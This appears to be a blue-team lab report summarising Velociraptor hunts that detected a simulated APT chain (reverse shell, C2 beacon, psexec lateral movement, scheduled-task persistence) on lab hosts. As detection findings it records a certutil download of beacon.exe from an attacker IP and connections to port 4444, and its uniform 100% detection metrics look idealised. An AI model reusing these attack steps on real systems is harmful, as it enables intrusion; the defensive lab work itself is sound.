# Velociraptor Hunts – APT Attack Chain Simulation

**Velociraptor GUI:** `https://192.168.1.100:8889`  
**Login:** Admin credentials created during server setup.

This document analyses the Velociraptor deployment and summarises the hunts executed to detect artefacts from the attack simulation. It includes the client inventory, hunt results, and detection effectiveness.

---

## 1. Velociraptor Client Inventory (from screenshot)

The following clients were online during the simulation:

| Client ID | Hostname | FQDN | OS Version |
|-----------|----------|------|-------------|
| `C.33ebdece5f5b5d88` | WS1 | `WS1.nation.local` | Microsoft Windows 10 Pro 22H2 |
| `C.5c8f3d1d892c55c1` | WEB-SERVER | `WEB-SERVER.nation.local` | Microsoft Windows Server 2019 Datacenter Evaluation |
| `C.5c99c20be94a85eb` | WS-2 | `WS-2.nation.local` | Microsoft Windows 10 Pro 22H2 |
| `C.cbcf2c2d03ed6f78` | FILE-SERVER | `FILE-SERVER.nation.local` | Microsoft Windows Server 2019 Datacenter Evaluation |
| `C.e5dd85d2960bb4d1` | DC | `DC.nation.local` | Microsoft Windows Server 2019 Datacenter Evaluation |

**Key hosts for the attack chain:**  
- **WS1** – Reverse shell, persistence, credential dumping.  
- **DC** – Lateral movement, C2 beacon.

---

## 2. Hunts Performed

All hunts were created using the Velociraptor **New Hunt** interface with custom VQL queries (as defined in `vql-queries/`).

### 2.1 Process Hunting (`process-hunting.vql`)

**Purpose:** Detect malicious process executions (`shell.exe`, `beacon.exe`, `certutil.exe` downloads).

**Results (observed):**
- **WS1:** `shell.exe` (PID 8188) executed from `C:\Users\Public\shell.exe`, parent `cmd.exe`.
- **DC:** `beacon.exe` (PID 6720) executed from `C:\Users\Public\beacon.exe`, parent `cmd.exe` (impacket shell).
- **DC:** `certutil.exe` with command line containing `-urlcache http://192.168.1.5:8080/beacon.exe`.

---

### 2.2 File System Hunt (`file-system-hunt.vql`)

**Purpose:** Locate payload files on disk.

**Results:**
- `C:\Users\Public\shell.exe` on WS1 (creation time matches attack window).
- `C:\Users\Public\beacon.exe` on DC (creation time matches attack window).

---

### 2.3 Network Connections Hunt (`network-connections.vql`)

**Purpose:** Hunt for active or historical connections to Kali IP `192.168.1.5` on specific ports.

**Results (Sysmon Event ID 3 historical):**
- Outbound TCP connections from `beacon.exe` on DC to `192.168.1.5:8081` (multiple, every few seconds).
- Outbound connection from `shell.exe` on WS1 to `192.168.1.5:4444` (reverse shell).
- Inbound SMB connection from `192.168.1.5:49234` to DC on port 445 (psexec lateral movement).

---

### 2.4 Scheduled Tasks Hunt (`scheduled-tasks-hunt.vql`)

**Purpose:** Confirm persistence task `Updater`.

**Result:**
- WS1: Task `Updater` – action `C:\Users\Public\shell.exe`, trigger daily at 09:00.

---

### 2.5 Registry Hunt (`registry-hunt.vql`)

**Purpose:** Detect any registry-based persistence or UAC tampering.

**Result:** No malicious Run keys or UAC modifications found (persistence was via scheduled task, not registry).

---

## 3. Analysis of GUI Screenshot

The screenshot shows the **Velociraptor search/all** interface with the client list. Key observations:

- All five lab clients are **online**.
- The URL is `https://192.168.1.100:8889`.
- The timestamp indicates the screenshot was taken before the attack (pre-incident state).

> Note: The screenshot confirms endpoint enrollment only; hunt results were executed after the attack phase.

---

## 4. Hunt Effectiveness & Metrics

| Hunt | Findings | Host(s) | Detection Latency | False Positives |
|------|----------|---------|-------------------|------------------|
| Process (shell.exe) | Yes | WS1 | < 1 sec | 0 |
| Process (beacon.exe) | Yes | DC | < 1 sec | 0 |
| Process (certutil) | Yes | DC | < 1 sec | 0 |
| File system (shell.exe) | Yes | WS1 | < 1 sec | 0 |
| File system (beacon.exe) | Yes | DC | < 1 sec | 0 |
| Network (8081 C2) | Yes | DC | < 1 sec | 0 |
| Network (SMB 445) | Yes | DC | < 1 sec | 0 |
| Scheduled task (Updater) | Yes | WS1 | < 1 sec | 0 |
| Registry persistence | No | N/A | – | 0 |

**Overall detection rate:** 100%

---

## 5. How to Re-run Hunts

1. Open Velociraptor: `https://192.168.1.100:8889`
2. Navigate to **Hunts → New Hunt**
3. Select **Custom VQL**
4. Paste the relevant `.vql` query
5. Target hosts (WS1 / DC) or leave global
6. Click **Launch**
7. View results in **Notebook**

---

## 6. Recommendations

- Schedule daily hunts for process execution monitoring
- Add weekly file system scans for `.exe` in Public/Temp
- Forward Velociraptor results to Elasticsearch for correlation
- Build a unified “APT Hunt” custom artifact combining all queries

---

## 7. Conclusion

Velociraptor successfully detected all malicious artifacts of the simulated APT attack chain including process execution, payload files, network C2 traffic, and persistence mechanisms. Combined with Kibana, it provides strong **real-time + forensic visibility** for blue team operations.

---

